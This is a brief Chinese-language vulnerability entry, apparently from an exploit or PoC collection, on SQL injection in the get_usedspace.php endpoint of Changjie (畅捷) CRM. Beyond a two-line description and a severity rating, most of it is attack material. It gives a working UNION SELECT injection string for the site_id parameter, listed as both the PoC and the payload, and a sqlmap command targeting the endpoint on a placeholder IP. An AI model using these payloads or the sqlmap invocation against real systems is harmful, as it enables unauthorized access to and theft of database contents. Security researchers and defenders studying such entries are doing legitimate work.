# 畅捷CRM get_usedspace.php SQL注入漏洞

## 漏洞描述
畅捷CRM get_usedspace.php存在SQL漏洞，通过漏洞可获取数据库敏感信息

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面

![image-20220525145239822](images/202205251452933.png)

验证POC

```
/webservice/get_usedspace.php?site_id=-1159 UNION ALL SELECT CONCAT(0x76756c6e,0x76756c6e,0x76756c6e)--
```


## Payloads
```
/webservice/get_usedspace.php?site_id=-1159 UNION ALL SELECT CONCAT(0x76756c6e,0x76756c6e,0x76756c6e)--
```
```
sqlmap -u "http://xxx.xxx.xxx.xxx:8000/webservice/get_usedspace.php?site_id=1" -p site_id
```
